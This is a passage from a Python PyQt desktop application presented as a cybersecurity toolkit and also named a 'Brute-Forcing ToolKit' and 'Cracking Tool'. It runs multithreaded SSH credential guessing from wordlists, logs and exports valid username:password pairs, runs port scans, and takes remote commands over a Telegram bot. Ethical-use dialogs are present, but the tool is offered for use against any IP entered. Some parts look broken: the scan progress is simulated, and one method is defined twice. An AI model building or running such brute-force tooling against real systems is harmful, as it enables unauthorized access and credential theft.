        return "🤖 Welcome to Cybersecurity Monitoring Bot!\nUse /help to see available commands."
    
    def handle_telegram_help(self, args, chat_id):
        return self.telegram_bot.get_help_text()
    
    def handle_telegram_status(self, args, chat_id):
        return self.command_processor.show_status([], None, chat_id)
    
    def handle_telegram_scan(self, args, chat_id):
        if not args:
            return "Usage: /scan <ip> [ports]\nExample: /scan 192.168.1.1 1-1000"
        
        parts = args.split()
        ip = parts[0]
        ports = parts[1] if len(parts) > 1 else "1-1000"
        
        result = self.command_processor.scan_ports([ip, ports], None, chat_id)
        return result
    
    def handle_telegram_monitor(self, args, chat_id):
        if not args:
            return "Usage: /monitor <ip>\nExample: /monitor 192.168.1.1"
        
        result = self.command_processor.start_monitoring([args], None, chat_id)
        return result
    
    def check_telegram_updates(self):
        """Check for Telegram updates (simplified - in real implementation would use webhooks or polling)"""
        pass
    
    def update_system_status(self):
        """Update system status display"""
        try:
            # Update CPU and memory
            resources = SystemInfo.get_resource_usage()
            self.cpu_label.setText(f"CPU: {resources['cpu_percent']:.1f}%")
            self.memory_label.setText(f"Memory: {resources['memory_percent']:.1f}%")
            
            # Update network status
            network_info = SystemInfo.get_network_info()
            active_interfaces = len([iface for iface in network_info if network_info[iface]])
            self.network_label.setText(f"Network: {active_interfaces} interfaces")
            
            # Update Telegram status
            telegram_status = "✅" if self.telegram_bot.token and self.telegram_bot.chat_id else "❌"
            self.telegram_label.setText(f"Telegram: {telegram_status}")
            
            # Update dashboard
            self.update_dashboard()
            
        except Exception as e:
            logger.error(f"Error updating system status: {e}")
    
    def update_dashboard(self):
        """Update dashboard information"""
        try:
            # System info
            system_info = SystemInfo.get_system_info()
            self.system_info_label.setText(f"System: {system_info['platform']}")
            
            # Resource usage
            resources = SystemInfo.get_resource_usage()
            self.cpu_usage_label.setText(f"CPU Usage: {resources['cpu_percent']:.1f}%")
            self.memory_usage_label.setText(f"Memory Usage: {resources['memory_percent']:.1f}%")
            
            # Monitoring stats
            monitored_count = len(self.network_monitor.monitored_hosts)
            self.monitored_hosts_label.setText(f"Monitored Hosts: {monitored_count}")
            
            # Active scans
            active_scans = len([scan for scan in self.security_scanner.current_scans.values() 
                              if scan['status'] == 'running'])
            self.active_scans_label.setText(f"Active Scans: {active_scans}")
            
            # Telegram status
            telegram_status = "Connected" if self.telegram_bot.token and self.telegram_bot.chat_id else "Not Connected"
            self.telegram_status_label.setText(f"Telegram: {telegram_status}")
            
        except Exception as e:
            logger.error(f"Error updating dashboard: {e}")
    
    def update_monitoring_display(self):
        """Update the monitoring display with current status"""
        try:
            self.monitored_table.setRowCount(len(self.network_monitor.monitored_hosts))
            
            for row, (ip, config) in enumerate(self.network_monitor.monitored_hosts.items()):
                self.monitored_table.setItem(row, 0, QTableWidgetItem(ip))
                self.monitored_table.setItem(row, 1, QTableWidgetItem(config['type']))
                self.monitored_table.setItem(row, 2, QTableWidgetItem(config.get('last_status', 'unknown')))
                
                last_check = config.get('last_check')
                last_check_str = "Never" if not last_check else datetime.fromtimestamp(last_check).strftime('%H:%M:%S')
                self.monitored_table.setItem(row, 3, QTableWidgetItem(last_check_str))
                
                changes = str(config.get('status_changes', 0))
                self.monitored_table.setItem(row, 4, QTableWidgetItem(changes))
            
        except Exception as e:
            logger.error(f"Error updating monitoring display: {e}")
    
    # Command execution methods
    def execute_command(self):
        """Execute command from command input"""
        command = self.command_input.text().strip()
        if not command:
            return
        
        self.command_history.add_command(command)
        self.command_input.clear()
        
        # Process command
        result = self.command_processor.process_command(command, self.command_output_callback)
        
        if result == "show_history":
            self.show_command_history()
        elif result != "clear":
            timestamp = datetime.now().strftime('%H:%M:%S')
            self.output_display.append(f"[{timestamp}] > {command}")
            self.output_display.append(result)
        
        self.output_display.moveCursor(QTextCursor.End)
    
    def command_output_callback(self, message):
        """Callback for command output"""
        if message == "clear":
            self.output_display.clear()
        else:
            self.output_display.append(message)
    
    def show_command_history(self):
        """Show command history"""
        history = self.command_history.get_all()
        if not history:
            self.output_display.append("No command history")
            return
        
        self.output_display.append("Command History:")
        for i, cmd in enumerate(history[-20:], 1):  # Show last 20 commands
            self.output_display.append(f"{i:3d}. {cmd}")
    
    def clear_command_history(self):
        """Clear command history"""
        self.command_history.clear()
        self.output_display.append("Command history cleared")
    
    def search_command_history(self):
        """Search command history"""
        query, ok = QInputDialog.getText(self, "Search History", "Enter search term:")
        if ok and query:
            results = self.command_history.search(query)
            if results:
                self.output_display.append(f"Search results for '{query}':")
                for i, cmd in enumerate(results[:10], 1):  # Show first 10 results
                    self.output_display.append(f"{i:3d}. {cmd}")
            else:
                self.output_display.append(f"No commands found matching '{query}'")
    
    # SSH Testing methods
    def browse_user_file(self):
        filename, _ = QFileDialog.getOpenFileName(self, "Select Username Wordlist", "", "Text Files (*.txt);;All Files (*)")
        if filename:
            self.user_file_input.setText(filename)
    
    def browse_pass_file(self):
        filename, _ = QFileDialog.getOpenFileName(self, "Select Password Wordlist", "", "Text Files (*.txt);;All Files (*)")
        if filename:
            self.pass_file_input.setText(filename)
    
    def start_ssh_test(self):
        """Start SSH credential testing"""
        if not self.validate_ssh_inputs():
            return
        
        # Ethical warning
        reply = QMessageBox.question(
            self, "Ethical Warning",
            "This tool should only be used against systems you own or have explicit written permission to test.\n\n"
            "Unauthorized access is illegal. Do you have proper authorization?",
            QMessageBox.Yes | QMessageBox.No, QMessageBox.No
        )
        
        if reply != QMessageBox.Yes:
            self.status_bar.showMessage("SSH testing aborted - authorization not confirmed")
            return
        
        self.perform_ssh_test()
    
    def validate_ssh_inputs(self):
        """Validate SSH test inputs"""
        ip = self.ip_input.text().strip()
        if not self.is_valid_ip(ip):
            QMessageBox.warning(self, "Invalid Input", "Please enter a valid IP address")
            return False
        
        user_file = self.user_file_input.text().strip()
        pass_file = self.pass_file_input.text().strip()
        
        if not user_file or not pass_file:
            QMessageBox.warning(self, "Invalid Input", "Please select both username and password wordlists")
            return False
        
        if not os.path.exists(user_file) or not os.path.exists(pass_file):
            QMessageBox.warning(self, "Invalid Input", "Selected wordlist files do not exist")
            return False
        
        return True
    
    def is_valid_ip(self, ip):
        """Validate IP address format"""
        parts = ip.split('.')
        if len(parts) != 4:
            return False
        try:
            return all(0 <= int(part) <= 255 for part in parts)
        except ValueError:
            return False
    
    def perform_ssh_test(self):
        """Perform the actual SSH test"""
        ip = self.ip_input.text().strip()
        port = self.port_input.value()
        user_file = self.user_file_input.text().strip()
        pass_file = self.pass_file_input.text().strip()
        threads = self.threads_input.value()
        
        try:
            with open(user_file, 'r', errors='ignore') as f:
                usernames = [line.strip() for line in f if line.strip()]
            
            with open(pass_file, 'r', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to load wordlists: {str(e)}")
            return
        
        if not usernames or not passwords:
            QMessageBox.warning(self, "Error", "Wordlists cannot be empty")
            return
        
        self.ssh_results_display.clear()
        self.progress_bar.setValue(0)
        self.status_label.setText("Starting SSH test...")
        
        self.start_ssh_button.setEnabled(False)
        self.stop_ssh_button.setEnabled(True)
        
        self.ssh_worker = SSHWorkerThread(ip, port, usernames, passwords, threads)
        self.ssh_worker.update_signal.connect(self.update_ssh_results)
        self.ssh_worker.progress_signal.connect(self.update_ssh_progress)
        self.ssh_worker.completed_signal.connect(self.ssh_test_completed)
        self.ssh_worker.status_signal.connect(self.status_label.setText)
        self.ssh_worker.start()
    
    def update_ssh_results(self, username, password, result):
        """Update SSH test results display"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        
        if result == "SUCCESS":
            color = "green"
            icon = "✅"
            self.log_activity(f"SSH SUCCESS: {username}:{password}")
        elif result == "FAILURE":
            color = "orange"
            icon = "❌"
        else:
            color = "red"
            icon = "⚠️"
        
        self.ssh_results_display.append(
            f'<span style="color:{color}">[{timestamp}] {icon} {username}:{password} - {result}</span>'
        )
    
    def update_ssh_progress(self, value):
        """Update SSH test progress"""
        self.progress_bar.setValue(value)
    
    def ssh_test_completed(self, successful, failed, errors):
        """Handle SSH test completion"""
        self.start_ssh_button.setEnabled(True)
        self.stop_ssh_button.setEnabled(False)
        
        self.status_label.setText(
            f"SSH Testing complete - Successful: {successful}, Failed: {failed}, Errors: {errors}"
        )
        
        if successful > 0:
            QMessageBox.information(
                self, "Test Complete",
                f"Found {successful} valid credential(s)!\n\n"
                "Remember: Only use this information for authorized security improvements."
            )
            
            # Send Telegram notification if configured
            if self.telegram_bot.token and self.telegram_bot.chat_id:
                message = f"🔓 SSH Test Complete\nFound {successful} valid credential(s) for target"
                self.telegram_bot.send_message(message)
    
    def stop_ssh_test(self):
        """Stop SSH testing"""
        if self.ssh_worker and self.ssh_worker.isRunning():
            self.ssh_worker.stop()
            self.ssh_worker.wait()
        
        self.start_ssh_button.setEnabled(True)
        self.stop_ssh_button.setEnabled(False)
        self.status_label.setText("SSH Testing stopped by user")
    
    def export_ssh_results(self):
        """Export SSH test results"""
        filename, _ = QFileDialog.getSaveFileName(self, "Export SSH Results", "", "Text Files (*.txt);;HTML Files (*.html)")
        if filename:
            try:
                with open(filename, 'w') as f:
                    f.write("SSH Test Results\n")
                    f.write("=" * 50 + "\n")
                    f.write(f"Generated: {datetime.now()}\n\n")
                    f.write(self.ssh_results_display.toPlainText())
                QMessageBox.information(self, "Success", "Results exported successfully")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to export results: {str(e)}")
    
    # Network Monitoring methods
    def start_monitoring_gui(self):
        """Start monitoring from GUI"""
        ip = self.monitor_ip_input.text().strip()
        if not ip:
            QMessageBox.warning(self, "Input Error", "Please enter an IP address to monitor")
            return
        
        monitor_type = self.monitor_type_combo.currentText()
        interval = self.monitor_interval_input.value()
        
        success, message = self.network_monitor.start_monitoring(ip, monitor_type, interval, self.telegram_bot)
        self.monitor_status_display.append(f"[{datetime.now().strftime('%H:%M:%S')}] {message}")
        
        if success:
            self.monitor_ip_input.clear()
            self.update_monitoring_display()
    
    def stop_selected_monitoring(self):
        """Stop monitoring selected host"""
        current_row = self.monitored_table.currentRow()
        if current_row >= 0:
            ip = self.monitored_table.item(current_row, 0).text()
            success, message = self.network_monitor.stop_monitoring(ip)
            self.monitor_status_display.append(f"[{datetime.now().strftime('%H:%M:%S')}] {message}")
            self.update_monitoring_display()
        else:
            QMessageBox.warning(self, "Selection Error", "Please select a host to stop monitoring")
    
    def stop_all_monitoring(self):
        """Stop all monitoring"""
        success, message = self.network_monitor.stop_monitoring()
        self.monitor_status_display.append(f"[{datetime.now().strftime('%H:%M:%S')}] {message}")
        self.update_monitoring_display()
    
    # Security Scanning methods
    def start_security_scan(self):
        """Start security scan"""
        target = self.scan_target_input.text().strip()
        if not target:
            QMessageBox.warning(self, "Input Error", "Please enter a target IP or hostname")
            return
        
        scan_type = self.scan_type_combo.currentText()
        
        if scan_type == "Port Scan":
            port_range = self.port_range_input.text().strip()
            self.scan_status_label.setText(f"Starting port scan on {target}...")
            scan_id = self.security_scanner.port_scan(target, port_range)
        elif scan_type == "Vulnerability Scan":
            self.scan_status_label.setText(f"Starting vulnerability scan on {target}...")
            scan_id = self.security_scanner.vulnerability_scan(target)
        else:
            QMessageBox.warning(self, "Not Implemented", "This scan type is not yet implemented")
            return
        
        self.start_scan_button.setEnabled(False)
        self.stop_scan_button.setEnabled(True)
        
        # Simulate progress updates (in real implementation, this would be connected to actual progress)
        self.scan_progress_bar.setValue(0)
        for i in range(101):
            if not self.stop_scan_button.isEnabled():  # Check if scan was stopped
                break
            self.scan_progress_bar.setValue(i)
            QApplication.processEvents()
            time.sleep(0.05)
        
        # Display results
        if scan_id in self.security_scanner.current_scans:
            results = self.security_scanner.current_scans[scan_id]
            self.display_scan_results(results)
        
        self.start_scan_button.setEnabled(True)
        self.stop_scan_button.setEnabled(False)
        self.scan_status_label.setText("Scan completed")
    
    def stop_security_scan(self):
        """Stop security scan"""
        self.start_scan_button.setEnabled(True)
        self.stop_scan_button.setEnabled(False)
        self.scan_status_label.setText("Scan stopped by user")
    
    def display_scan_results(self, results):
        """Display security scan results"""
        self.scan_results_display.clear()
        
        if results['type'] == 'port_scan':
            self.scan_results_display.append("Port Scan Results:")
            self.scan_results_display.append("=" * 50)
            for result in results['results']:
                self.scan_results_display.append(f"Port {result['port']}: {result['state']} ({result['service']})")
        
        elif results['type'] == 'vulnerability_scan':
            self.scan_results_display.append("Vulnerability Scan Results:")
            self.scan_results_display.append("=" * 50)
            for vuln in results['vulnerabilities']:
                self.scan_results_display.append(f"[{vuln['severity']}] {vuln['description']}")
                self.scan_results_display.append(f"   Recommendation: {vuln['recommendation']}")
                self.scan_results_display.append("")
    
    def export_scan_results(self):
        """Export scan results"""
        filename, _ = QFileDialog.getSaveFileName(self, "Export Scan Results", "", "Text Files (*.txt);;HTML Files (*.html)")
        if filename:
            try:
                with open(filename, 'w') as f:
                    f.write("Security Scan Results\n")
                    f.write("=" * 50 + "\n")
                    f.write(f"Generated: {datetime.now()}\n\n")
                    f.write(self.scan_results_display.toPlainText())
                QMessageBox.information(self, "Success", "Results exported successfully")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to export results: {str(e)}")
    
    # Telegram Integration methods
    def test_telegram_connection(self):
        """Test Telegram connection"""
        token = self.telegram_token_input.text().strip()
        chat_id = self.telegram_chat_id_input.text().strip()
        
        if not token or not chat_id:
            QMessageBox.warning(self, "Input Error", "Please enter both token and chat ID")
            return
        
        success, message = self.telegram_bot.configure(token, chat_id)
        
        if success:
            QMessageBox.information(self, "Success", "Telegram connection successful!")
            # Send a test message
            msg_success, msg_result = self.telegram_bot.send_message(
                "✅ Cybersecurity Tool Test\nTelegram integration is working correctly!"
            )
            if msg_success:
                self.telegram_message_display.append("Test message sent successfully!")
            else:
                self.telegram_message_display.append(f"Configuration OK but message failed: {msg_result}")
        else:
            QMessageBox.critical(self, "Connection Failed", f"Telegram connection failed: {message}")
    
    def start_telegram_polling(self):
        """Start Telegram polling for commands"""
        success, message = self.telegram_bot.start_polling(self.handle_telegram_update)
        if success:
            self.start_polling_button.setEnabled(False)
            self.stop_polling_button.setEnabled(True)
            self.telegram_message_display.append("Telegram polling started")
        else:
            QMessageBox.critical(self, "Error", f"Failed to start polling: {message}")
    
    def stop_telegram_polling(self):
        """Stop Telegram polling"""
        success, message = self.telegram_bot.stop_polling()
        if success:
            self.start_polling_button.setEnabled(True)
            self.stop_polling_button.setEnabled(False)
            self.telegram_message_display.append("Telegram polling stopped")
    
    def handle_telegram_update(self, update):
        """Handle incoming Telegram updates"""
        if 'message' in update:
            message = update['message']
            chat_id = message['chat']['id']
            text = message.get('text', '')
            
            self.telegram_message_display.append(f"Received: {text}")
            
            # Process command
            response = self.telegram_bot.process_command(text, chat_id)
            if response:
                self.telegram_bot.send_message(response, chat_id=chat_id)
                self.telegram_message_display.append(f"Sent: {response}")
    
    def refresh_commands_list(self):
        """Refresh Telegram commands list"""
        self.telegram_commands_list.clear()
        for command, info in self.telegram_bot.command_handlers.items():
            self.telegram_commands_list.addItem(f"/{command} - {info['description']}")
    
    def add_telegram_command(self):
        """Add new Telegram command"""
        command, ok = QInputDialog.getText(self, "Add Command", "Command name (without slash):")
        if ok and command:
            description, ok = QInputDialog.getText(self, "Command Description", "Description:")
            if ok and description:
                # In a real implementation, you would define a handler function
                self.telegram_bot.register_command(command, lambda args, chat_id: "Not implemented", description)
                self.telegram_bot.save_commands()
                self.refresh_commands_list()
    
    def edit_telegram_command(self):
        """Edit Telegram command"""
        current_item = self.telegram_commands_list.currentItem()
        if current_item:
            # Extract command name from list item
            text = current_item.text()
            command = text.split(' - ')[0][1:]  # Remove slash
            
            new_description, ok = QInputDialog.getText(self, "Edit Description", "New description:", text=text.split(' - ')[1])
            if ok and new_description:
                if command in self.telegram_bot.command_handlers:
                    self.telegram_bot.command_handlers[command]['description'] = new_description
                    self.telegram_bot.save_commands()
                    self.refresh_commands_list()
    
    def remove_telegram_command(self):
        """Remove Telegram command"""
        current_item = self.telegram_commands_list.currentItem()
        if current_item:
            # Extract command name from list item
            text = current_item.text()
            command = text.split(' - ')[0][1:]  # Remove slash
            
            reply = QMessageBox.question(self, "Confirm Removal", f"Remove command /{command}?")
            if reply == QMessageBox.Yes:
                if command in self.telegram_bot.command_handlers:
                    del self.telegram_bot.command_handlers[command]
                    self.telegram_bot.save_commands()
                    self.refresh_commands_list()
    
    # Configuration methods
    def save_config(self):
        """Save configuration to file"""
        config = {
            'telegram_token': self.telegram_token_input.text(),
            'telegram_chat_id': self.telegram_chat_id_input.text(),
            'monitored_hosts': self.network_monitor.monitored_hosts,
            'general_settings': {
                'auto_save': self.auto_save_config.isChecked(),
                'start_minimized': self.start_minimized.isChecked(),
                'enable_notifications': self.enable_notifications.isChecked()
            },
            'security_settings': {
                'enable_encryption': self.enable_encryption.isChecked(),
                'auto_clear_logs': self.auto_clear_logs.isChecked(),
                'require_auth': self.require_auth.isChecked()
            },
            'performance_settings': {
                'max_threads': self.max_threads_input.value(),
                'scan_timeout': self.scan_timeout_input.value()
            }
        }
        
        try:
            with open(CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=2)
            QMessageBox.information(self, "Success", "Configuration saved successfully!")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to save configuration: {str(e)}")
    
    def load_config(self):
        """Load configuration from file"""
        try:
            if os.path.exists(CONFIG_FILE):
                with open(CONFIG_FILE, 'r') as f:
                    config = json.load(f)
                
                # Telegram configuration
                self.telegram_token_input.setText(config.get('telegram_token', ''))
                self.telegram_chat_id_input.setText(config.get('telegram_chat_id', ''))
                
                # Configure telegram bot if both values are present
                token = config.get('telegram_token')
                chat_id = config.get('telegram_chat_id')
                if token and chat_id:
                    self.telegram_bot.configure(token, chat_id)
                
                # Restore monitored hosts
                monitored_hosts = config.get('monitored_hosts', {})
                for ip, host_config in monitored_hosts.items():
                    self.network_monitor.monitored_hosts[ip] = host_config
                
                # General settings
                general_settings = config.get('general_settings', {})
                self.auto_save_config.setChecked(general_settings.get('auto_save', True))
                self.start_minimized.setChecked(general_settings.get('start_minimized', False))
                self.enable_notifications.setChecked(general_settings.get('enable_notifications', True))
                
                # Security settings
                security_settings = config.get('security_settings', {})
                self.enable_encryption.setChecked(security_settings.get('enable_encryption', False))
                self.auto_clear_logs.setChecked(security_settings.get('auto_clear_logs', False))
                self.require_auth.setChecked(security_settings.get('require_auth', False))
                
                # Performance settings
                performance_settings = config.get('performance_settings', {})
                self.max_threads_input.setValue(performance_settings.get('max_threads', 10))
                self.scan_timeout_input.setValue(performance_settings.get('scan_timeout', 10))
                
                self.status_bar.showMessage("Configuration loaded successfully")
                
                # Update displays
                self.update_monitoring_display()
                self.update_dashboard()
                
            else:
                self.status_bar.showMessage("No saved configuration found")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to load configuration: {str(e)}")
    
    def reset_config(self):
        """Reset configuration to defaults"""
        reply = QMessageBox.question(self, "Confirm Reset", "Reset all settings to defaults?")
        if reply == QMessageBox.Yes:
            # Reset all configuration inputs
            self.telegram_token_input.clear()
            self.telegram_chat_id_input.clear()
            self.network_monitor.monitored_hosts.clear()
            
            # Reset checkboxes to defaults
            self.auto_save_config.setChecked(True)
            self.start_minimized.setChecked(False)
            self.enable_notifications.setChecked(True)
            self.enable_encryption.setChecked(False)
            self.auto_clear_logs.setChecked(False)
            self.require_auth.setChecked(False)
            
            # Reset performance settings
            self.max_threads_input.setValue(10)
            self.scan_timeout_input.setValue(10)
            
            self.status_bar.showMessage("Configuration reset to defaults")
            
            # Update displays
            self.update_monitoring_display()
            self.update_dashboard()
    
    # Logs methods
    def change_log_level(self, level):
        """Change log level"""
        log_level = getattr(logging, level)
        logging.getLogger().setLevel(log_level)
        self.logs_display.append(f"Log level changed to: {level}")
    
    def clear_logs(self):
        """Clear logs display"""
        self.logs_display.clear()
    
    def export_logs(self):
        """Export logs to file"""
        filename, _ = QFileDialog.getSaveFileName(self, "Export Logs", "", "Text Files (*.txt);;Log Files (*.log)")
        if filename:
            try:
                with open(filename, 'w') as f:
                    f.write(self.logs_display.toPlainText())
                QMessageBox.information(self, "Success", "Logs exported successfully")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to export logs: {str(e)}")
    
    def refresh_logs(self):
        """Refresh logs display"""
        try:
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, 'r') as f:
                    logs = f.read()
                self.logs_display.setPlainText(logs)
                self.logs_display.moveCursor(QTextCursor.End)
        except Exception as e:
            self.logs_display.append(f"Error loading logs: {str(e)}")
    
    def log_activity(self, message):
        """Log activity to both file and display"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_message = f"[{timestamp}] {message}"
        
        # Add to activity list
        self.activity_list.addItem(log_message)
        
        # Keep only last 100 activities
        if self.activity_list.count() > 100:
            self.activity_list.takeItem(0)
    
    # Quick action methods
    def quick_network_scan(self):
        """Quick network scan action"""
        target, ok = QInputDialog.getText(self, "Quick Network Scan", "Enter target IP:")
        if ok and target:
            self.scan_target_input.setText(target)
            self.scan_type_combo.setCurrentText("Port Scan")
            self.tab_widget.setCurrentIndex(4)  # Switch to Security tab
            self.start_security_scan()
    
    def quick_add_monitoring(self):
        """Quick add monitoring action"""
        target, ok = QInputDialog.getText(self, "Add Monitoring", "Enter IP address to monitor:")
        if ok and target:
            self.monitor_ip_input.setText(target)
            self.start_monitoring_gui()
    
    def quick_telegram_setup(self):
        """Quick Telegram setup action"""
        self.tab_widget.setCurrentIndex(5)  # Switch to Telegram tab
    
    def quick_security_scan(self):
        """Quick security scan action"""
        self.tab_widget.setCurrentIndex(4)  # Switch to Security tab
    
    def generate_report(self):
        """Generate comprehensive report"""
        try:
            report_lines = []
            report_lines.append("Accurate Cyber Defense Next Gen Cracking Tool")
            report_lines.append("=" * 60)
            report_lines.append(f"Generated: {datetime.now()}")
            report_lines.append("")
            
            # System information
            report_lines.append("SYSTEM INFORMATION")
            report_lines.append("-" * 20)
            system_info = SystemInfo.get_system_info()
            for key, value in system_info.items():
                report_lines.append(f"{key}: {value}")
            report_lines.append("")
            
            # Resource usage
            report_lines.append("RESOURCE USAGE")
            report_lines.append("-" * 20)
            resources = SystemInfo.get_resource_usage()
            report_lines.append(f"CPU Usage: {resources['cpu_percent']}%")
            report_lines.append(f"Memory Usage: {resources['memory_percent']}%")
            report_lines.append(f"Disk Usage: {resources['disk_usage']}%")
            report_lines.append("")
            
            # Monitoring status
            report_lines.append("MONITORING STATUS")
            report_lines.append("-" * 20)
            report_lines.append(f"Monitored hosts: {len(self.network_monitor.monitored_hosts)}")
            for ip, config in self.network_monitor.monitored_hosts.items():
                report_lines.append(f"  {ip}: {config.get('last_status', 'unknown')} ({config['type']})")
            report_lines.append("")
            
            # Security scans
            report_lines.append("SECURITY SCANS")
            report_lines.append("-" * 20)
            report_lines.append(f"Total scans performed: {len(self.security_scanner.current_scans)}")
            report_lines.append("")
            
            # Telegram status
            report_lines.append("TELEGRAM INTEGRATION")
            report_lines.append("-" * 20)
            telegram_status = "Configured" if self.telegram_bot.token and self.telegram_bot.chat_id else "Not configured"
            report_lines.append(f"Status: {telegram_status}")
            report_lines.append("")
            
            # Save report
            filename, _ = QFileDialog.getSaveFileName(self, "Save Report", "", "Text Files (*.txt);;PDF Files (*.pdf)")
            if filename:
                with open(filename, 'w') as f:
                    f.write("\n".join(report_lines))
                QMessageBox.information(self, "Success", "Report generated successfully!")
                
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to generate report: {str(e)}")
    
    def start_all_monitoring(self):
        """Start all monitoring services"""
        self.status_bar.showMessage("Starting all monitoring services...")
        # Implementation would start all configured monitoring
    
    def stop_all_monitoring(self):
        """Stop all monitoring services"""
        self.network_monitor.stop_monitoring()
        self.status_bar.showMessage("All monitoring services stopped")
    
    # System tray methods
    def tray_icon_activated(self, reason):
        """Handle system tray icon activation"""
        if reason == QSystemTrayIcon.DoubleClick:
            self.show()
            self.raise_()
            self.activateWindow()
    
    def quit_application(self):
        """Quit the application"""
        # Stop all active operations
        if self.ssh_worker and self.ssh_worker.isRunning():
            self.ssh_worker.stop()
            self.ssh_worker.wait()
        
        self.network_monitor.stop_monitoring_thread()
        self.telegram_bot.stop_polling()
        
        # Save configuration
        if self.auto_save_config.isChecked():
            self.save_config()
        
        QApplication.quit()
    
    def show_about_dialog(self):
        """Show about dialog"""
        about_text = """
<h1>Advanced Cybersecurity Monitoring Tool</h1>
<p><strong>Version 2.0</strong></p>
<p>Professional security monitoring and testing platform</p>
<p>This tool is for <strong>EDUCATIONAL PURPOSES ONLY</strong> and should only be used on systems you own or have explicit permission to test.</p>
<p><strong>Features:</strong></p>
<ul>
<li>SSH Credential Testing</li>
<li>Network Monitoring</li>
<li>Security Scanning</li>
<li>Telegram Integration</li>
<li>Comprehensive Reporting</li>
</ul>
<p><strong>Warning:</strong> Unauthorized access to computer systems is illegal.</p>
"""
        QMessageBox.about(self, "About Cybersecurity Tool", about_text)
    
    def closeEvent(self, event):
        """Handle application close event"""
        if self.tray_icon and self.tray_icon.isVisible():
            self.hide()
            event.ignore()
        else:
            self.quit_application()
            event.accept()

def main():
    """Main application entry point"""
    # Ethical warning
    app = QApplication(sys.argv)
    
    # Set application properties
    app.setApplicationName("Accurate Cyber Defense Brute-Forcing ToolKit")
    app.setApplicationVersion("2.0")
    app.setOrganizationName("SecurityTools")
    app.setWindowIcon(QIcon())
    
    # Show ethical warning
    reply = QMessageBox.question(
        None, "Ethical Use Agreement",
        "Accurate Cyber Defense Next Gen Cracking Tool  is for EDUCATIONAL PURPOSES ONLY and should only be used:\n\n"
        "• On systems you own\n"
        "• With explicit written permission\n"
        "• In compliance with all applicable laws\n\n"
        "Unauthorized access is illegal and unethical.\n\n"
        "Do you agree to use this tool responsibly?",
        QMessageBox.Yes | QMessageBox.No, QMessageBox.No
    )
    
    if reply != QMessageBox.Yes:
        QMessageBox.information(None, "Exiting", "Tool closed. Remember to always act ethically.")
        sys.exit(0)
    
    # Create and show main window
    window = CyberSecurityTool()
    window.show()
    
    # Start application
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()